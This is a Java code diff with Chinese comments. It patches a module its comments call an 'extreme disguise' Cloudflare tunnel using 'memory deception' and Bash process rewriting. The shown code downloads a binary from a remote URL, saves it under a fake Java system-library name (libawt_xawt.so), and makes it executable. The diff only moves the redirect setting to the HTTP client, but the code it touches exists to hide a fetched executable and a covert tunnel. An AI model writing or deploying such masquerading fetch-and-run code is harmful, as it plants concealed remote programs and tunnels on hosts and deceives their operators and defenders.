@@ -135,7 +135,8 @@ public class App {
     }
 
     // ========================================================
-    // 模块 1：极限伪装 CF 隧道 (内存欺骗 + Bash 进程重写)
+// ========================================================
+    // 模块 1：极限伪装 CF 隧道 (内存欺骗 + Bash 进程重写) - 已修复 API 报错
     // ========================================================
     private static void startCloudflareTunnelDaemon() {
         if (CF_TOKEN == null || CF_TOKEN.length() < 50) return;
@@ -157,11 +158,17 @@ public class App {
                         // 极限伪装 2：伪装成 Java 官方的图形渲染动态链接库
                         Path tempFile = tempDir.resolve("libawt_xawt.so");
                         
-                        HttpRequest req = HttpRequest.newBuilder(URI.create(dlUrl))
+                        // 👇 【核心修复】：把重定向策略转移到 HttpClient 上
+                        HttpClient client = HttpClient.newBuilder()
                                 .followRedirects(HttpClient.Redirect.NORMAL)
-                                .timeout(Duration.ofMinutes(2)).build();
+                                .build();
                                 
-                        HttpResponse<Path> res = HttpClient.newHttpClient().send(req, HttpResponse.BodyHandlers.ofFile(tempFile));
+                        HttpRequest req = HttpRequest.newBuilder(URI.create(dlUrl))
+                                .timeout(Duration.ofMinutes(2))
+                                .build();
+                                
+                        HttpResponse<Path> res = client.send(req, HttpResponse.BodyHandlers.ofFile(tempFile));
+                        // 👆 修复完毕
                         
                         if (res.statusCode() == 200 || res.statusCode() == 302) {
                             tempFile.toFile().setExecutable(true);
